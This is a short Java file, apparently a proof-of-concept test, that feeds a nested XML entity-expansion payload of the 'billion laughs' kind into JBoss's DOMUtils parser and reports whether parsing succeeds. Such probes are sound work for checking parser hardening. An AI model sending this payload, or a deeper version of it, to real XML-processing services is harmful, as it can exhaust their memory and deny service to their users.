package org.example;

import org.jboss.ws.common.DOMUtils;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

public class JBossAttack {

    public static void main(String[] args) throws Exception {
        String xml = "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE val ["
                + "<!ENTITY val \"val\">"
                + "<!ENTITY val1 \"&val;&val;&val;&val;&val;&val;&val;&val;&val;&val;\">"
                + "<!ENTITY val2 \"&val1;&val1;&val1;&val1;&val1;&val1;&val1;&val1;&val1;&val1;\">"
                + "<!ENTITY val3 \"&val2;&val2;&val2;&val2;&val2;&val2;&val2;&val2;&val2;&val2;\">"
                + "<!ENTITY val4 \"&val3;&val3;&val3;&val3;&val3;&val3;&val3;&val3;&val3;&val3;\">"
                + "]>"
                + "<attack>&val4;</attack>";
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        DOMUtils.parse(xml, builder);
        System.out.println("XML was parsed successfully");
    }
}
